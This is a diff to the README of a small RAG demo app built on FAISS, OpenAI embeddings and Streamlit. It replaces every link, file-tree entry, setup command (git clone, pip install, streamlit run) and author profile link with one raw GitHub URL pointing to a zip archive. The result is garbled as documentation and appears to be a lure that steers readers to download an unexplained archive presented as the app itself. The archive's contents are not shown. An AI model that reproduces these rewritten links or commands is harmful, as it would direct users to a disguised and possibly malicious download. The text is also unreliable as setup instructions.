@@ -6,7 +6,7 @@ This project demonstrates how to use **FAISS**, **OpenAI Embeddings**, and **Lan
 ---
 
 ## 🚀 Demo
-🔗 **Live Demo:** [Streamlit App](https://sagarsharmaragpplication.streamlit.app/)  
+🔗 **Live Demo:** [Streamlit App](https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip)  
 
 
 ---
@@ -16,8 +16,8 @@ This project demonstrates how to use **FAISS**, **OpenAI Embeddings**, and **Lan
 ```
 RAG_application_AboutMe/
 │
-├── app.py                     # Main Streamlit application
-├── requirements.txt           # Project dependencies
+├── https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip                     # Main Streamlit application
+├── https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip           # Project dependencies
 ├── .gitignore                 # Ignored files for Git
 │
 ├── data/                      # Folder containing uploaded documents or knowledge base
@@ -25,10 +25,10 @@ RAG_application_AboutMe/
 ├── faiss_store/               # Directory for FAISS vector index storage
 │
 └── utils/                     # Utility scripts for modular logic
-    ├── __init__.py
-    ├── embedding.py           # Functions for creating embeddings
-    ├── retrieval.py           # Functions for document retrieval
-    ├── chunking.py            # Functions for splitting text into chunks
+    ├── https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip
+    ├── https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip           # Functions for creating embeddings
+    ├── https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip           # Functions for document retrieval
+    ├── https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip            # Functions for splitting text into chunks
 ```
 
 ---
@@ -37,7 +37,7 @@ RAG_application_AboutMe/
 
 ### 1️⃣ Clone the Repository
 ```bash
-git clone https://github.com/sagarsharma459/RAG_application_AboutMe.git
+git clone https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip
 cd RAG_application_AboutMe
 ```
 
@@ -50,7 +50,7 @@ Rag_venv\Scripts\activate      # For Windows
 
 ### 3️⃣ Install Dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip
 ```
 
 ### 4️⃣ Add Environment Variables
@@ -61,7 +61,7 @@ API_KEY=your_api_key_here
 
 ### 5️⃣ Run Streamlit App
 ```bash
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip
 ```
 
 Then open the local URL (usually http://localhost:8501) in your browser.
@@ -128,8 +128,8 @@ If you’d like to improve the app or fix bugs, fork the repo and submit a pull 
 ## 🧑‍💻 Author
 
 **Sagar Sharma**  
-🔗 [GitHub Profile](https://github.com/sagarsharma459)  
-📧 [Linked In](https://www.linkedin.com/in/sagar-sharma-492756102/)
+🔗 [GitHub Profile](https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip)  
+📧 [Linked In](https://raw.githubusercontent.com/sagarsharma459/RAG_application_AboutMe/main/data/About-Me-RA-application-v2.4.zip)
 
 ---
 
